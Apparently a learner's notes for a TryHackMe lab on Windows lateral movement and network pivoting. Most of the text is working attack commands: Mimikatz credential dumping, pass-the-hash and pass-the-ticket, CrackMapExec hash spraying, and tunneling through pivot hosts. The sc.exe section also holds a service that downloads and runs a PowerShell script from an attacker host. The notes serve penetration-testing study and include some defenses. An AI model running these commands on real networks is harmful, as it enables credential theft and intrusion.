
### Name: Dhruv Sharma | Date: 11-06-2026 | Platform: TryHackMe

---

# 🧠 QUICK CONCEPT — What & Why

```
Lateral Movement:
→ Moving FROM one compromised machine
  TO another machine in the network
→ Goal: Reach high-value targets
  (Domain Controller, File Server, etc.)

Pivoting:
→ Using a compromised machine as a
  launch pad to reach OTHER networks
→ Networks that attacker CANNOT reach directly

Why needed:
→ Initial access = low-priv workstation
→ Real target = Domain Controller
→ Path: Workstation → Server → DC
```

---

# TASK 1 — Moving Around the Network

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Understand what credentials/tokens
are needed for lateral movement
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:

Two things needed for lateral movement:
→ Valid credentials (password / hash / ticket)
→ A way to execute commands remotely

Credential types available:
┌─────────────────────────────────────────┐
│ Type          │ What it is              │
├─────────────────────────────────────────┤
│ Plaintext     │ Actual password         │
│ NTLM Hash     │ Hashed password         │
│ Kerberos TGT  │ Full domain ticket      │
│ Kerberos TGS  │ Service-specific ticket │
└─────────────────────────────────────────┘

Where credentials are stored on Windows:
→ LSASS memory      ← main target
→ SAM database      ← local accounts
→ NTDS.dit          ← all domain accounts (DC only)
→ Credential Manager← saved browser/app creds
→ Registry          ← LSA secrets
```

---

# TASK 2 — Spawning Processes Remotely

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Execute commands on remote machines
using different built-in Windows methods
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
METHOD 1 — PSExec (Port 445 SMB)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 How it works:
→ Uploads a service binary to ADMIN$ share
→ Registers it as a Windows service
→ Runs command through that service
→ Gives SYSTEM shell!

Requirement: Admin share (ADMIN$) access
             = local admin on target

💻 Commands:

# Using PSExec (Sysinternals)
psexec \\<target-ip> -u <user> -p <pass> cmd.exe

# Using Metasploit
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser <user>
set SMBPass <pass>
run

# Using Impacket (from Linux/Kali)
impacket-psexec <domain>/<user>:<pass>@<target-ip>
impacket-psexec za.tryhackme.com/t1_leonard.summers:pass@10.10.10.x

# With NTLM hash (no plaintext needed!)
impacket-psexec <domain>/<user>@<target> -hashes <LM>:<NT>
impacket-psexec za.tryhackme.com/admin@10.10.10.x \
  -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99

⚠️  Detection: Creates a service → noisy!
    Blue team sees new service being registered

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
METHOD 2 — WMI (Port 135 + dynamic ports)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 How it works:
→ Windows Management Instrumentation
→ Built-in Windows remote management
→ Creates process remotely via WMI
→ More stealthy than PSExec

Requirement: Admin credentials on target

💻 Commands:

# From CMD (using wmic)
wmic /user:<user> /password:<pass>
     /node:<target>
     process call create "cmd.exe /c <command>"

# Example — run whoami and save to file
wmic /user:Administrator /password:Passw0rd123
     /node:10.10.10.5
     process call create
     "cmd.exe /c whoami > C:\output.txt"

# From PowerShell
$cred = Get-Credential
Invoke-WmiMethod -Class Win32_Process
                 -Name Create
                 -ArgumentList "cmd.exe /c whoami > C:\out.txt"
                 -ComputerName <target>
                 -Credential $cred

# Using Impacket (from Kali)
impacket-wmiexec <domain>/<user>:<pass>@<target>
impacket-wmiexec za.tryhackme.com/admin:pass@10.10.10.x

# With hash
impacket-wmiexec <domain>/<user>@<target> -hashes <LM>:<NT>

⚠️  Detection: Less noisy than PSExec
    But WMI activity logged in event logs

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
METHOD 3 — WinRM (Port 5985/5986)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 How it works:
→ Windows Remote Management (HTTP based)
→ Port 5985 = HTTP | Port 5986 = HTTPS
→ Gives interactive PowerShell session
→ Very commonly used by IT admins (stealthy!)

Requirement: Target in WinRM allowed list
             or "Remote Management Users" group

💻 Commands:

# Interactive PS session (from Windows)
Enter-PSSession -ComputerName <target>
                -Credential <domain>\<user>

# Run single command remotely
Invoke-Command -ComputerName <target>
               -Credential <domain>\<user>
               -ScriptBlock { whoami }

# Run script remotely
Invoke-Command -ComputerName <target>
               -Credential $cred
               -ScriptBlock { Get-Process }

# Using Evil-WinRM (from Kali) ← BEST tool
evil-winrm -i <target-ip> -u <user> -p <pass>
evil-winrm -i 10.10.10.x -u administrator -p Passw0rd

# Evil-WinRM with hash (no password!)
evil-winrm -i <target-ip> -u <user> -H <NT-hash>
evil-winrm -i 10.10.10.x -u admin -H 5f4dcc3b5aa765d61d8327deb882cf99

⚠️  Detection: Looks like normal admin activity
    Hardest to detect of all methods

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
METHOD 4 — sc.exe (Service Control)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 How it works:
→ Create/modify Windows services remotely
→ Service runs as SYSTEM = instant privesc
→ Command runs when service starts

💻 Commands:

# Create a remote service
sc.exe \\<target> create <service-name>
       binPath= "cmd.exe /c <command>"

# Start the service (executes command)
sc.exe \\<target> start <service-name>

# Full example — create reverse shell service
sc.exe \\10.10.10.5 create evilsvc
       binPath= "cmd.exe /c powershell -c
       IEX(New-Object Net.WebClient).DownloadString
       ('http://attacker/shell.ps1')"
sc.exe \\10.10.10.5 start evilsvc

# Cleanup after use
sc.exe \\10.10.10.5 stop evilsvc
sc.exe \\10.10.10.5 delete evilsvc

⚠️  Detection: Service creation = very noisy
    Event ID 7045 = new service installed

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
METHOD 5 — Task Scheduler (schtasks)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 How it works:
→ Schedule a task to run on remote machine
→ Task runs as SYSTEM or specified user
→ Can trigger on time, event, logon, etc.

💻 Commands:

# Create remote scheduled task
schtasks /create /s <target>
         /u <domain>\<user> /p <pass>
         /tn "TaskName"
         /tr "cmd.exe /c whoami > C:\out.txt"
         /sc once
         /sd 01/01/2024 /st 00:00

# Run task immediately
schtasks /run /s <target>
         /u <domain>\<user> /p <pass>
         /tn "TaskName"

# Check task result
schtasks /query /s <target>
         /u <domain>\<user> /p <pass>
         /tn "TaskName"

# Delete task (cleanup!)
schtasks /delete /s <target>
         /u <domain>\<user> /p <pass>
         /tn "TaskName" /f

⚠️  Detection: Scheduled task creation logged
    Event ID 4698 = new scheduled task

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 METHODS COMPARISON:
┌────────────┬─────────┬──────────┬──────────┐
│ Method     │ Port    │ Noise    │ Result   │
├────────────┼─────────┼──────────┼──────────┤
│ PSExec     │ 445     │ High     │ SYSTEM   │
│ WMI        │ 135     │ Medium   │ Admin    │
│ WinRM      │ 5985    │ Low      │ PS Shell │
│ sc.exe     │ 445     │ High     │ SYSTEM   │
│ schtasks   │ 445     │ Medium   │ SYSTEM   │
└────────────┴─────────┴──────────┴──────────┘
```

---

# TASK 3 — Pass-the-Hash (PtH)

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Use captured NTLM hash to authenticate
WITHOUT knowing plaintext password
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
→ NTLM auth uses hash directly — hash IS password
→ No need to crack it — use it directly!
→ Works on any service using NTLM auth
→ Source of hashes: LSASS, SAM, NTDS.dit

Hash format: LM:NT
Example: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
         ← blank LM (common)            ← NT hash (what we use)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Extract hashes — Mimikatz (on compromised Windows)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
→ Shows NTLM hashes of logged-in users

# Extract local SAM hashes — Mimikatz
mimikatz # token::elevate
mimikatz # lsadump::sam
→ Shows local account hashes

# Pass-the-Hash with Evil-WinRM
evil-winrm -i <target> -u <user> -H <NT-hash>
evil-winrm -i 10.10.10.x -u Administrator \
  -H 5f4dcc3b5aa765d61d8327deb882cf99

# Pass-the-Hash with Impacket PSExec
impacket-psexec -hashes <LM>:<NT> <domain>/<user>@<target>
impacket-psexec -hashes :5f4dcc3b5aa765d61d8327deb882cf99 \
  za.tryhackme.com/Administrator@10.10.10.x

# Pass-the-Hash with Impacket WMIExec
impacket-wmiexec -hashes <LM>:<NT> <domain>/<user>@<target>

# Pass-the-Hash with Impacket SMBExec
impacket-smbexec -hashes <LM>:<NT> <domain>/<user>@<target>

# Pass-the-Hash with CrackMapExec (spray across network!)
crackmapexec smb <subnet> -u <user> -H <NT-hash>
crackmapexec smb 10.10.10.0/24 -u Administrator \
  -H 5f4dcc3b5aa765d61d8327deb882cf99
→ Finds ALL machines where this hash works!
→ "(Pwned!)" = local admin access confirmed

# Pass-the-Hash with xfreerdp (RDP access)
xfreerdp /v:<target> /u:<user>
         /pth:<NT-hash>
xfreerdp /v:10.10.10.x /u:Administrator \
         /pth:5f4dcc3b5aa765d61d8327deb882cf99

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️  LIMITATION:
→ Only works with NTLM auth
→ Kerberos-only environments = PtH fails
→ "Protected Users" group = PtH fails
→ LocalAccountTokenFilterPolicy must allow it
   for local admin accounts

🛡️ DEFENSE:
→ Enable Credential Guard
→ Add admins to "Protected Users" group
→ Unique local admin passwords (LAPS!)
→ Disable NTLM where possible
```

---

# TASK 4 — Pass-the-Ticket (PtT)

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Steal Kerberos tickets from memory and
inject them to authenticate as that user
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
→ Kerberos tickets stored in LSASS memory
→ Extract them → inject into YOUR session
→ Now you ARE that user for Kerberos auth
→ No password OR hash needed!

Two ticket types:
TGT → full domain access (most valuable)
TGS → single service access

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Extract tickets — Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
→ Saves all tickets as .kirbi files
→ Look for TGT tickets (most valuable!)

# List tickets currently in session
mimikatz # kerberos::list

# Inject ticket into current session — Mimikatz
mimikatz # kerberos::ptt <ticket.kirbi>
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi

# Extract + inject with Rubeus
# List all tickets
Rubeus.exe triage

# Dump specific ticket
Rubeus.exe dump /luid:0x427fcd5 /nowrap

# Inject ticket
Rubeus.exe ptt /ticket:<base64-ticket>

# Verify injection worked
klist
→ Shows currently loaded tickets

# Use the injected ticket
dir \\<target>\C$
→ Should work now without entering password!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 KEY POINT:
PtH  = NTLM auth   (uses hash)
PtT  = Kerberos    (uses ticket)
Both = no plaintext password needed!

🛡️ DEFENSE:
→ Credential Guard (protects LSASS)
→ Privileged Access Workstations (PAW)
→ Monitor Event ID 4768/4769 anomalies
```

---

# TASK 5 — Overpass-the-Hash / Pass-the-Key

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Convert NTLM hash into a Kerberos ticket
(Best of both worlds!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
→ Have NTLM hash but environment uses Kerberos?
→ Use hash to REQUEST a Kerberos TGT
→ Now use that TGT for Pass-the-Ticket!

Why useful:
→ PtH blocked? → Convert hash → Kerberos TGT
→ Get full Kerberos authentication with just a hash
→ Bypasses NTLM restrictions

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Overpass-the-Hash — Mimikatz
# (Requests TGT using NTLM hash)
mimikatz # privilege::debug
mimikatz # sekurlsa::pth
          /user:<username>
          /domain:<domain>
          /ntlm:<NT-hash>
          /run:cmd.exe

# Example
mimikatz # sekurlsa::pth
          /user:t1_toby.beck
          /domain:za.tryhackme.com
          /ntlm:533f1bd576caa912bdb9da284bbc60fe
          /run:cmd.exe
→ Opens new CMD with Kerberos TGT loaded!

# Using Rubeus (cleaner method)
# Request TGT using hash
Rubeus.exe asktgt
          /user:<username>
          /domain:<domain>
          /rc4:<NT-hash>
          /ptt
→ /ptt = inject immediately into session

# Example
Rubeus.exe asktgt /user:t1_toby.beck
          /domain:za.tryhackme.com
          /rc4:533f1bd576caa912bdb9da284bbc60fe
          /ptt

# Verify
klist
→ Should show TGT for that user

# Now use it
dir \\<target>\C$    ← works as that user!
```

---

# TASK 6 — Remote Process Execution Summary

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 QUICK DECISION GUIDE:

Got plaintext password?
→ Evil-WinRM / PSExec / WMIExec → any method

Got NTLM hash?
→ PtH with Evil-WinRM or Impacket tools

Got Kerberos ticket?
→ PtT with Mimikatz or Rubeus

In Kerberos-only environment?
→ Overpass-the-Hash → get TGT → PtT

Want stealth?
→ WinRM / WMI (less noisy)

Want SYSTEM shell?
→ PSExec / sc.exe / schtasks

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 MOST USED COMBO IN REAL ASSESSMENTS:

Step 1: CrackMapExec spray the network
crackmapexec smb 10.10.10.0/24
            -u Administrator -H <hash>
→ Find all machines where hash works

Step 2: Evil-WinRM into confirmed machine
evil-winrm -i <target> -u <user> -H <hash>

Step 3: Dump more hashes from that machine
mimikatz → sekurlsa::logonpasswords

Step 4: Repeat — move deeper into network
```

---

# TASK 7 — Port Forwarding

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Make a port on a remote machine
accessible through the pivot host
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
Problem:
Attacker cannot reach 10.0.0.20:3389 directly
But pivot host (10.0.0.5) CAN reach it

Solution:
Forward Attacker:4444 → PivotHost → 10.0.0.20:3389
Now attacker connects to localhost:4444
And ACTUALLY reaches 10.0.0.20:3389!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Method 1 — netsh (Windows pivot host)
# Forward local port to remote machine
netsh interface portproxy add
      v4tov4
      listenaddress=0.0.0.0
      listenport=<local-port>
      connectaddress=<target-ip>
      connectport=<target-port>

# Example — forward 4444 to RDP of internal host
netsh interface portproxy add
      v4tov4
      listenaddress=0.0.0.0
      listenport=4444
      connectaddress=10.0.0.20
      connectport=3389

# View current rules
netsh interface portproxy show all

# Delete rule (cleanup)
netsh interface portproxy delete
      v4tov4
      listenaddress=0.0.0.0
      listenport=4444

# Now connect from attacker:
xfreerdp /v:PIVOT-HOST:4444 /u:<user> /p:<pass>

# Method 2 — socat (Linux pivot host)
socat TCP-LISTEN:<local-port>,fork
      TCP:<target>:<target-port>

# Example
socat TCP-LISTEN:4444,fork TCP:10.0.0.20:3389

# Method 3 — Meterpreter port forward
portfwd add -l <local-port>
            -p <remote-port>
            -r <remote-host>

portfwd add -l 4444 -p 3389 -r 10.0.0.20
→ localhost:4444 → 10.0.0.20:3389
```

---

# TASK 8 — SSH Tunneling

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Route traffic through SSH connections
to reach otherwise inaccessible networks
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 THREE TYPES:
1. Local  → Bring remote service to your machine
2. Remote → Expose your machine to remote network
3. Dynamic→ Full SOCKS proxy (all ports)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TYPE 1 — Local Port Forward (-L)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Use case:
"I want to access internal RDP through SSH"

Attacker:localhost:4444 → SSH tunnel →
PivotHost → Target:3389

💻 Command:
ssh -L <local-port>:<target-ip>:<target-port>
    <user>@<pivot-host>

# Example — access internal RDP via pivot
ssh -L 4444:10.0.0.20:3389
    user@jump.tryhackme.com

# Now connect RDP to localhost:
xfreerdp /v:localhost:4444 /u:<user> /p:<pass>

# Access internal web server
ssh -L 8080:10.0.0.30:80 user@pivot
# Then browse: http://localhost:8080

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TYPE 2 — Remote Port Forward (-R)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Use case:
"Victim machine calls back to me
 through its own SSH connection"

Victim opens connection → Attacker machine port open

💻 Command:
# Run on VICTIM machine (calls back to attacker)
ssh -R <attacker-port>:localhost:<victim-port>
    <user>@<attacker-ip>

# Example — expose victim's RDP to attacker
# (run on victim)
ssh -R 4444:localhost:3389 kali@attacker-ip

# Attacker can now:
xfreerdp /v:localhost:4444 /u:<user> /p:<pass>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TYPE 3 — Dynamic Port Forward (-D) ← MOST USEFUL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 Use case:
"Route ALL my tools through pivot host
 to reach internal network"

Creates a SOCKS proxy — any port, any IP!

💻 Commands:
# Create SOCKS proxy on local port 1080
ssh -D 1080 user@pivot-host
ssh -D 1080 user@jump.tryhackme.com

# Now configure proxychains
nano /etc/proxychains.conf
→ Add at bottom:
  socks5 127.0.0.1 1080

# Use ANY tool through the tunnel!
proxychains nmap -sT 10.0.0.0/24
proxychains evil-winrm -i 10.0.0.20 -u admin -p pass
proxychains impacket-psexec admin:pass@10.0.0.20
proxychains firefox    ← browse internal sites!

# Useful flags:
-f  → run SSH in background
-N  → don't execute remote command
     (just tunnel, no shell)
-f -N combined for clean background tunnel:
ssh -D 1080 -f -N user@pivot-host
```

---

# TASK 9 — SOCKS Proxy + Proxychains

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Route attack tools through pivot host
to reach internal network segments
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
SOCKS Proxy = Traffic relay
Proxychains = Forces any tool to use the proxy

Flow:
Tool → Proxychains → SOCKS Proxy (pivot) → Target

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Configure Proxychains
nano /etc/proxychains.conf
# Comment out "strict_chain" add "dynamic_chain"
# At the bottom add:
socks5 127.0.0.1 1080   ← SSH dynamic forward
# OR
socks4 127.0.0.1 9050   ← Tor / other

# Method 1 — SSH Dynamic (Linux pivot)
ssh -D 1080 -f -N user@pivot-host

# Method 2 — Chisel (when no SSH on pivot)
# On attacker (server):
./chisel server -p 8080 --reverse

# On pivot (client):
./chisel client attacker-ip:8080 R:socks
→ Creates reverse SOCKS proxy on attacker:1080

# Method 3 — Meterpreter SOCKS
# In Metasploit:
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run

# Then add route:
route add 10.0.0.0/24 <session-id>

# Method 4 — ligolo-ng (modern, fast)
# On attacker:
./proxy -selfcert

# On pivot:
./agent -connect attacker-ip:11601 -ignore-cert

# In ligolo console:
session        → select session
start          → start tunnel
# Add route on attacker:
ip route add 10.0.0.0/24 dev ligolo

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 USING TOOLS WITH PROXYCHAINS:

proxychains nmap -sT -Pn 10.0.0.1-20
           ← use -sT (TCP connect, not SYN)
           ← -Pn (skip ping, ICMP won't work)

proxychains evil-winrm -i 10.0.0.5 -u admin -p pass
proxychains impacket-psexec admin:pass@10.0.0.5
proxychains crackmapexec smb 10.0.0.0/24 -u admin -p pass
proxychains xfreerdp /v:10.0.0.5 /u:admin /p:pass
```

---

# TASK 10 — Double Pivot

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🎯 GOAL:
Chain two pivot hosts to reach a
third network segment
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💡 CONCEPT:
Network layout:
Attacker → [Firewall] → DMZ → [Firewall] →
Corporate → [Firewall] → Sensitive

Two pivots needed:
Pivot 1: DMZ machine
Pivot 2: Corporate machine

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💻 IMP COMMANDS:

# Step 1 — SSH tunnel to Pivot 1
ssh -D 1080 -f -N user@pivot1

# Step 2 — Through Pivot 1, SSH to Pivot 2
# Add to proxychains.conf:
socks5 127.0.0.1 1080

# Now SSH THROUGH proxychains to Pivot 2
proxychains ssh -D 1081 -f -N user@pivot2

# Step 3 — Update proxychains for double hop
nano /etc/proxychains.conf
socks5 127.0.0.1 1080   ← Pivot 1
socks5 127.0.0.1 1081   ← Pivot 2

# Now reach Sensitive Network
proxychains nmap -sT -Pn 172.16.0.0/24
proxychains evil-winrm -i 172.16.0.1 -u admin -p pass

# Metasploit double pivot
# After first session:
route add 10.0.0.0/24 1        ← session 1
# After second session:
route add 172.16.0.0/24 2      ← session 2
# Now scan Sensitive Network:
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.0.0/24
run
```

---

